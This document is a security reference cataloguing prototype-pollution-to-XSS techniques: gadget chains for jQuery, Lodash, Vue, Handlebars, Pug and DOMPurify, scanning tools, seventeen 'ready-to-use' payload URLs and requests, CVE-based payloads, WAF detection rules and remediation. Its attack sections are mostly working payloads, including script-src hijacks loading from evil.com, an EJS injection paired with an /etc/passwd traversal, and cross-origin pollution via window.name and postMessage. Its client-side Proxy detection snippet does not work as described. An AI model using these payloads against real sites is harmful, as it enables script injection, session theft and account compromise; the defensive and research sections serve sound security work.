# 28 - Prototype Pollution to XSS

## Overview

Prototype pollution (PP) is a JavaScript vulnerability where an attacker can inject properties into `Object.prototype`, affecting all objects in the application. On its own, PP is often low-severity. However, when combined with **script gadgets** -- existing application code that reads polluted properties and passes them to dangerous sinks -- PP escalates to full cross-site scripting. This document catalogs pollution vectors, known gadget chains for popular libraries, exploitation techniques, detection tools, and ready-to-use payloads.

**Sources**: [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution), [PortSwigger - Widespread Prototype Pollution Gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets), [Securitum - PP and Bypassing Client-Side HTML Sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/), [s1r1us - Prototype Pollution](https://blog.s1r1us.ninja/research/PP), [HackTricks - Client Side Prototype Pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html), [Beyond XSS - Prototype Pollution](https://aszx87410.github.io/beyond-xss/en/ch3/prototype-pollution/), [Intigriti 0124 Challenge - PP in jQuery](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/), [Snyk - CVE-2025-13465 Lodash](https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838), [PortSwigger Academy - Prototype Pollution Labs](https://nusharaariyawansa.medium.com/portswigger-academy-9-prototype-pollution-theory-lab-walkthroughs-5f19db58969c), [HackTricks - Express PP Gadgets](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html), [Intigriti 0124 Writeup - PP in axios to XSS](https://realansgar.dev/writeups/intigriti-xss-0124/), [NetSPI - Ultimate Guide to Prototype Pollution](https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/)

---

## 1. Client-Side Prototype Pollution Fundamentals

### 1.1 The Prototype Chain

Every JavaScript object inherits from `Object.prototype`. When a property is accessed on an object, the engine traverses the prototype chain until it finds the property or reaches `null`. Polluting `Object.prototype` means **every object** in the application inherits the attacker-controlled property unless it explicitly defines its own.

```javascript
// Pollution demonstration
Object.prototype.isAdmin = true;
const user = {};
console.log(user.isAdmin); // true -- inherited from polluted prototype
```

### 1.2 Pollution via URL Parameters

The most common client-side vector uses URL query/hash parameters parsed by vulnerable libraries:

```
https://target.com/page?__proto__[polluted]=value
https://target.com/page?__proto__.polluted=value
https://target.com/page?constructor[prototype][polluted]=value
https://target.com/page#__proto__[polluted]=value
```

### 1.3 Three Pollution Paths

| Path | Example | Mechanism |
|------|---------|-----------|
| `__proto__` | `obj.__proto__.x = 1` | Direct prototype access via dunder property |
| `constructor.prototype` | `obj.constructor.prototype.x = 1` | Access via constructor reference |
| `prototype` | `Foo.prototype.x = 1` | Direct on constructor functions |

### 1.4 Vulnerable Merge/Extend Functions

Deep merge utilities that recursively copy properties without filtering `__proto__` or `constructor` are the root cause:

```javascript
// VULNERABLE merge pattern
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // Recurses into __proto__
    } else {
      target[key] = source[key]; // Writes to Object.prototype
    }
  }
}

// Attack: merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'))
// Now: ({}).polluted === "yes"
```

### 1.5 Query String Parsing Pollution

Libraries that parse query strings into nested objects are frequent vectors:

- **qs** (npm): Versions before 6.10.3 allowed `__proto__` in parsed keys
- **query-string**: Parses into flat objects, generally safe unless combined with merge
- **jQuery $.param / deparam**: Custom deparam implementations often vulnerable
- **URL hash parsers**: Custom `location.hash` parsers frequently vulnerable

---

## 2. Gadgets for XSS: Library-Specific Chains

A "gadget" is existing code in a library or application that reads a property from an object (potentially polluted) and passes it to an XSS sink (e.g., element creation, attribute setting, script loading).

### 2.1 jQuery Gadgets

jQuery is the most gadget-rich library due to its pervasive DOM manipulation.

**$.extend deep merge (pollution source)**:
```javascript
// jQuery's $.extend with deep=true is a pollution vector
$.extend(true, {}, JSON.parse('{"__proto__": {"gadget": "payload"}}'));
```

**jQuery attr() gadget** (Intigriti 0124):
```javascript
// Pollute Object.prototype to control jQuery attr() behavior
// jQuery checks for hook functions on attribute setting
?__proto__[href]=javascript:alert(1)
// jQuery's attr() reads polluted properties when setting attributes
```

**jQuery html()/append() gadget**:
```javascript
// If app does: $(element).html(userObj.content)
// And userObj inherits from polluted prototype:
?__proto__[content]=<img src=x onerror=alert(1)>
```

**jQuery event delegation gadget**:
```javascript
?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror=alert(1)>
```

**jQuery off() sink** -- `delegateTarget` pollution:
```javascript
// Pollute delegateTarget to inject HTML via jQuery internals
?__proto__[delegateTarget]=<img/src/onerror=alert(1)>
// jQuery(types.delegateTarget).off() creates DOM from polluted value
```

### 2.2 Lodash / Underscore Gadgets

**Lodash template sourceURL (CVE-2019-10744)**:
Lodash <= 4.17.15:
```javascript
?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)
// The \u2028\u2029 characters break out of the sourceURL comment
// in Lodash's template Function constructor
```

**Lodash _.unset / _.omit PP (CVE-2025-13465)**:
Lodash <= 4.17.21 `_.unset` and `_.omit` can be used as pollution sources. Fixed in 4.17.23+.

**Underscore template**:
```javascript
// Similar to Lodash, Underscore's template uses Function constructor
?__proto__[sourceURL]=\u2028alert(1)
```

### 2.3 Vue.js Gadgets

Vue.js checks for a `template` property during component initialization:

```javascript
// Vue traverses prototype chain looking for 'template'
// If Object.prototype.template is polluted:
?__proto__[template]=<img src=x onerror=alert(1)>

// Vue 2 full build (with compiler): renders polluted template
// Vue 3: less susceptible due to virtual DOM changes, but gadgets exist
// in render function resolution
```

**Vue.js v-bind gadget**:
```javascript
// Pollute attributes that Vue binds dynamically
?__proto__[v-bind:class]=javascript:alert(1)
```

### 2.4 Pug (Jade) Template Gadgets

Server-side PP in Pug leads to RCE or client-side XSS injection:

```javascript
// Pug template engine uses block properties
?__proto__[block]={"type":"Text","val":"<script>alert(1)</script>"}

// Pug reads options from prototype chain
?__proto__[compileDebug]=1&__proto__[self]=1&__proto__[debug]=1
```

### 2.5 Handlebars Template Gadgets

```javascript
// Handlebars' parser is susceptible to PP
// Polluting non-numeric strings via prototype allows template injection
?__proto__[pendingContent]=<img src=x onerror=alert(1)>

// Handlebars lookup gadget
?__proto__[body]=<script>alert(1)</script>
?__proto__[type]=Program
```

### 2.6 Known Gadget Database

The [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) repository maintains the most comprehensive database of client-side PP gadgets, categorized by library. Key entries include:

| Library | Gadget Property | Sink | Impact |
|---------|----------------|------|--------|
| jQuery | `delegateTarget` | `jQuery()` constructor | DOM XSS |
| jQuery | `handler`, `selector` | Event delegation | DOM XSS |
| Lodash | `sourceURL` | `Function()` constructor | Code execution |
| Vue.js | `template` | Template compiler | DOM XSS |
| Handlebars | `pendingContent` | Template render | DOM XSS |
| Sanitize-html | `innerText` / `textContent` | Sanitizer bypass | XSS |
| Google Closure | `*` | `goog.html` | DOM XSS |
| Backbone.js | `model` | View render | DOM XSS |
| Ember.js | `template` | Component render | DOM XSS |
| Google Analytics | `cookieName` | Cookie setting | Session fixation |

---

## 3. Exploitation Chains

### 3.1 PP to innerHTML Modification

The most direct chain: pollute a property that gets passed to an `innerHTML` sink.

```javascript
// Application code:
// element.innerHTML = config.welcomeMessage || 'Hello';
// If config is a plain object and welcomeMessage is not set:
?__proto__[welcomeMessage]=<img src=x onerror=alert(document.domain)>
```

### 3.2 PP to script.src Modification

```javascript
// Application code:
// const script = document.createElement('script');
// script.src = options.analyticsUrl || '/analytics.js';
// If options does not define analyticsUrl:
?__proto__[analyticsUrl]=https://evil.com/xss.js
```

### 3.3 PP to Event Handler Injection

```javascript
// Application code:
// element.setAttribute('onclick', handlers.click);
// If handlers is empty object:
?__proto__[click]=alert(document.cookie)
```

### 3.4 PP to Sanitizer Bypass

Prototype pollution can bypass client-side HTML sanitizers by polluting their configuration:

**DOMPurify bypass (CVE-2024-45801)**:
```javascript
// Pollute Node.prototype.after before DOMPurify initializes
// Bypasses SAFE_FOR_TEMPLATES profile
// DOMPurify < 3.1.1 with SAFE_FOR_TEMPLATES enabled
?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src
```

**sanitize-html bypass**:
```javascript
// Pollute the allowedAttributes configuration
// {"__proto__":{"innerText":"<img/src/onerror=alert(1)>"}}
```

**General sanitizer bypass pattern**:
```javascript
// Many sanitizers check if a tag/attr is in an allowlist object
// Polluting that object adds entries to every allowlist:
?__proto__[onerror]=1&__proto__[onload]=1
// Now: ({}).onerror === 1, bypassing checks like:
// if (attr in allowedAttributes) ...
```

### 3.5 Server-Side PP to Client-Side XSS

Server-side prototype pollution (e.g., via JSON body parsing in Express) can inject properties that are rendered client-side:

```javascript
// POST body to Express endpoint:
{"__proto__": {"isAdmin": true, "injection": "<script>alert(1)</script>"}}

// If server renders user object in template:
// res.render('profile', { user: userObj });
// Template: <div>{{user.injection}}</div>
```

**Source**: [HackTricks - Express PP Gadgets](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html)

---

## 4. Tools for Finding PP Gadgets

### 4.1 DOM Invader (Burp Suite)

Built into Burp's embedded browser, DOM Invader automates:
- Detection of prototype pollution sources (URL params, postMessage, etc.)
- Scanning for known gadgets in loaded libraries
- Testing custom gadget properties against DOM sinks

### 4.2 PPScan (Chrome Extension)

[PPScan](https://github.com/nicedayzhu/ppscan) is a Chrome Extension that scans pages for client-side prototype pollution. It tests common pollution vectors and checks if the pollution persists.

### 4.3 Client-Side Prototype Pollution Scanner

Automated scanning via:
```javascript
// Inject into browser console or via extension
// Test if page is vulnerable to PP
(function() {
  const params = ['__proto__', 'constructor.prototype'];
  const props = ['pptest' + Math.random().toString(36).slice(2)];
  params.forEach(param => {
    const url = new URL(location);
    url.searchParams.set(`${param}[${props[0]}]`, 'polluted');
    fetch(url).then(() => {
      if (({}).hasOwnProperty(props[0]) || ({})[props[0]] === 'polluted') {
        console.log('[PP FOUND] via ' + param);
      }
    });
  });
})();
```

### 4.4 pp-finder (Automated)

```bash
# Automated prototype pollution finder
# Crawls site and tests URL parameter pollution
python3 pp-finder.py -u https://target.com --depth 3 --threads 10
```

### 4.5 Manual Testing Methodology

1. **Identify pollution source**: Test URL params, hash, postMessage, JSON inputs
2. **Confirm pollution**: `?__proto__[testprop]=testvalue` then check `({}).testprop` in console
3. **Identify loaded libraries**: Check for jQuery, Lodash, Vue, Angular, etc.
4. **Test known gadgets**: Cross-reference loaded libraries with gadget database
5. **Find custom gadgets**: Search application code for patterns like `obj[key]` where key is controllable
6. **Chain to XSS**: Combine pollution source + gadget to achieve script execution

---

## 5. Ready-to-Use Prototype Pollution to XSS Payloads

### Payload 1: jQuery $.extend PP Source + delegateTarget Gadget
```
https://target.com/?__proto__[delegateTarget]=<img/src/onerror=alert(1)>
```

### Payload 2: Lodash sourceURL Code Execution
```
https://target.com/?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(document.domain)//
```

### Payload 3: Vue.js Template Injection
```
https://target.com/?__proto__[template]=<div id=x></div><img src=x onerror=alert(1)>
```

### Payload 4: jQuery Event Handler Pollution
```
https://target.com/?__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror=alert(1)>
```

### Payload 5: Sanitizer ALLOWED_ATTR Bypass
```
https://target.com/?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src
```

### Payload 6: Script src Hijack
```
https://target.com/?__proto__[analyticsUrl]=//evil.com/xss.js
https://target.com/?__proto__[src]=//evil.com/xss.js
https://target.com/?__proto__[url]=//evil.com/xss.js
```

### Payload 7: innerHTML via Config Object
```
https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(1)>
https://target.com/?__proto__[outerHTML]=<img/src/onerror=alert(1)>
```

### Payload 8: Handlebars pendingContent
```
https://target.com/?__proto__[pendingContent]=<img/src/onerror=alert(1)>
```

### Payload 9: Constructor Prototype Path
```
https://target.com/?constructor[prototype][polluted]=value
https://target.com/?constructor.prototype.polluted=value
```

### Payload 10: Hash-Based Pollution (for SPA routers)
```
https://target.com/#__proto__[polluted]=value
https://target.com/#constructor[prototype][polluted]=value
```

### Payload 11: JSON Body PP (Server-Side)
```http
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true, "template": "<img src=x onerror=alert(1)>"}}
```

### Payload 12: Nested Pollution via Merge
```
https://target.com/?config[__proto__][polluted]=value
https://target.com/?settings[constructor][prototype][xss]=<img/src/onerror=alert(1)>
```

### Payload 13: Express Prototype Pollution Gadgets (Server-Side to XSS)
```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"__proto__": {"layout": "../../../../../etc/passwd", "outputFunctionName": "x;alert(1);x"}}
```
Targets EJS template engine: `outputFunctionName` is injected into generated template function.

### Payload 14: Google Closure Library
```
https://target.com/?__proto__[*]=[xss]&__proto__[tabIndex]=onfocus=alert(1)
```

### Payload 15: Multiple Pollution + Multiple Gadgets
```
https://target.com/?__proto__[sourceURL]=%E2%80%A8alert(1)&__proto__[template]=<img/src/onerror=alert(2)>&__proto__[innerHTML]=<img/src/onerror=alert(3)>
```
Sprays multiple gadget properties simultaneously -- whichever library/code is present gets triggered.

### Payload 16: PP via window.name (Cross-Origin)
```javascript
// From attacker page, set window.name before redirect
window.name = '{"__proto__":{"polluted":"xss"}}';
location = 'https://target.com/vulnerable-page';
// If target parses window.name as JSON and merges it:
// Pollution achieved cross-origin
```

### Payload 17: PP via postMessage
```javascript
// From attacker page:
const w = window.open('https://target.com');
setTimeout(() => {
  w.postMessage({
    "__proto__": { "innerHTML": "<img src=x onerror=alert(1)>" }
  }, '*');
}, 2000);
```

---

## 6. Detection Signatures and Indicators

### Server-Side Detection
```
# WAF rules for prototype pollution attempts
/__proto__/ in URL parameters
/constructor\[prototype\]/ in URL parameters
/constructor\.prototype/ in URL parameters
/"__proto__"/ in JSON request bodies
/"constructor"\s*:\s*{\s*"prototype"/ in JSON bodies
```

### Client-Side Detection
```javascript
// Freeze Object.prototype to detect and prevent pollution
Object.freeze(Object.prototype);
// Any pollution attempt will silently fail in strict mode
// or throw in non-strict mode

// Monitor for pollution:
const handler = {
  set(target, prop, value) {
    console.warn('Prototype pollution attempt:', prop, value);
    // Report to security monitoring
    return true; // Block the write
  }
};
Object.prototype = new Proxy(Object.prototype, handler);
```

---

## 7. Remediation

1. **Freeze prototypes**: `Object.freeze(Object.prototype)` at application startup
2. **Use null-prototype objects**: `Object.create(null)` for config/options objects
3. **Filter dangerous keys**: Block `__proto__`, `constructor`, `prototype` in merge operations
4. **Use Map instead of Object**: `new Map()` is immune to prototype pollution
5. **Update libraries**: Lodash >= 4.17.23, qs >= 6.10.3, DOMPurify latest
6. **CSP**: Strict CSP prevents loaded gadgets from executing injected scripts
7. **Trusted Types**: Prevents DOM XSS sinks from accepting raw strings

---
## [2024-2026 Research Update]

### GHunter: 133 Zero-Day Prototype Pollution Gadgets

**Research**: "GHunter: Universal Prototype Pollution Gadgets in JavaScript Runtimes" (arXiv 2407.10812, July 2024 preprint, 2025 publication)

The GaLA/GHunter framework introduced automated discovery of client-side prototype pollution gadgets at scale. Scanning one million websites, it found **133 zero-day gadgets** and turned **23 previously "no-impact" prototype pollution bugs** into working end-to-end exploits achieving XSS, cookie manipulation, and URL manipulation.

**Key findings**:
- The gap between "prototype pollution with no obvious impact" and "working XSS" is far smaller than previously assumed
- Gadgets were found in widely-deployed libraries and application code
- Common gadget patterns include: `innerHTML` sinks, `script.src` assignments, `document.write` calls, jQuery `$.extend` deep merge, and lodash `_.merge`/`_.set`/`_.setWith`

**Impact**: Security teams should treat **any** client-side prototype pollution as a potential XSS vector, even without an immediately obvious gadget.

**Source**: [arXiv 2407.10812](https://arxiv.org/pdf/2407.10812)

### Vue.js CVE-2024-6783: Prototype Pollution to XSS

**Affected versions**: Vue.js (specific versions; published to NVD 2024-07-23)

**Vulnerability**: XSS vulnerability allowing arbitrary JavaScript execution via prototype pollution. Vue.js's component initialization checks for a `template` property by traversing the prototype chain. Polluting `Object.prototype.template` causes Vue to render attacker-controlled templates.

**Exploitation**:
```
https://target.com/?__proto__[template]=<img src=x onerror=alert(document.domain)>
```

**Source**: [SentinelOne Vulnerability Database](https://www.sentinelone.com/vulnerability-database/cve-2024-6783/)

### DOMPurify CVE-2024-48910: Critical Sanitizer Bypass via Prototype Pollution

**Affected versions**: DOMPurify < 2.4.2
**CVSS**: 9.3 (Critical, Snyk rating)

**Vulnerability**: Improper property checks during HTML sanitization allow prototype pollution to bypass DOMPurify entirely. Because DOMPurify is the most widely used HTML sanitizer, a pollution-to-DOMPurify-bypass chain effectively neutralizes the primary defense against XSS in many applications.

**Exploitation pattern**:
```javascript
// Pollute prototype to add allowed attributes
Object.prototype.ALLOWED_ATTR = ['onerror', 'src'];
// DOMPurify now allows onerror through sanitization
DOMPurify.sanitize('<img src=x onerror=alert(1)>');
// Returns: <img src=x onerror=alert(1)>
```

**Source**: [Snyk SNYK-JS-DOMPURIFY-8318045](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8318045)

### Handlebars GHSA-2qvq-rjwj-gvw9: Unescaped Partial Rendering

**Affected versions**: Handlebars 4.0.0 through 4.7.8
**Fixed in**: 4.7.9 (March 2026)

**Vulnerability**: A polluted string value whose key matches a partial reference in a Handlebars template is rendered without HTML escaping. Template engines are especially vulnerable because they trust property lookups on the data object, and prototype pollution makes the entire prototype chain part of the data surface.

**Exploitation**:
```javascript
// Pollute prototype with partial name matching template reference
Object.prototype.userPartial = '<img src=x onerror=alert(1)>';
// Template: {{> userPartial}}
// Renders unescaped HTML from polluted prototype
```

**Source**: [GitHub Advisory GHSA-2qvq-rjwj-gvw9](https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9)

### vue-i18n GHSA-9r9m-ffp6-9x4v: Development Mode XSS

**Disclosed**: November 2024

**Vulnerability**: If locale message AST is used in development mode, XSS is possible through third-party injection via prototype pollution. The internationalization library's message compiler accesses properties from the prototype chain when resolving locale messages.

**Conditions**: Requires development mode with AST-based locale messages. Production builds with pre-compiled messages are not affected.

**Source**: [GitHub Advisory GHSA-9r9m-ffp6-9x4v](https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v)

### Updated Prototype Pollution to XSS Payloads (2024-2026)

```
# PP-2024-01: Vue.js CVE-2024-6783 template pollution
https://target.com/?__proto__[template]=<img src=x onerror=alert(document.domain)>

# PP-2024-02: DOMPurify CVE-2024-48910 ALLOWED_ATTR bypass
https://target.com/?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src&__proto__[ALLOWED_TAGS][]=img

# PP-2024-03: Handlebars GHSA-2qvq-rjwj-gvw9 partial injection
https://target.com/?__proto__[pendingContent]=<img/src/onerror=alert(1)>&__proto__[body]=<script>alert(1)</script>

# PP-2024-04: vue-i18n prototype pollution (dev mode)
https://target.com/?__proto__[locale]=<img src=x onerror=alert(1)>

# PP-2024-05: GHunter-style multi-gadget spray
https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(1)>&__proto__[template]=<img/src/onerror=alert(2)>&__proto__[sourceURL]=%E2%80%A8alert(3)&__proto__[pendingContent]=<img/src/onerror=alert(4)>
```
